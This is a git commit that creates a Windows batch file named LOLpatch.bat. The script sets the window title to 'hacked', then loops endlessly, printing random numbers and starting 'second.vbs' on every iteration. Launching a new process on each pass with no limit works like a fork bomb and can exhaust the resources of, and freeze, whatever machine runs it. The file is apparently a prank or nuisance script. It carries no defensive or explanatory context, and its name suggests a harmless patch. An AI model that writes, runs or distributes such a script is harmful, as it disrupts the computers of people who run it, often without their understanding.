f7cc8e1808184665e1f6e867bad8cdd60f1ca7f3
Oussama Ben Hadj Dahman <63789665+cybereagle2001@users.noreply.github.com>
2021-02-09 22:33:09 +0100

    Create LOLpatch.bat

---
+++ LOLpatch.bat
@@ -0,0 +1,10 @@
+@echo off
+echo <c> All Right Reserved To cybereagle2001
+@echo off
+title hacked
+color 0a
+cls
+:test
+echo %random%random%random%random%random%random%random%random%random%random%random%random%random%random%
+start second.vbs
+goto test
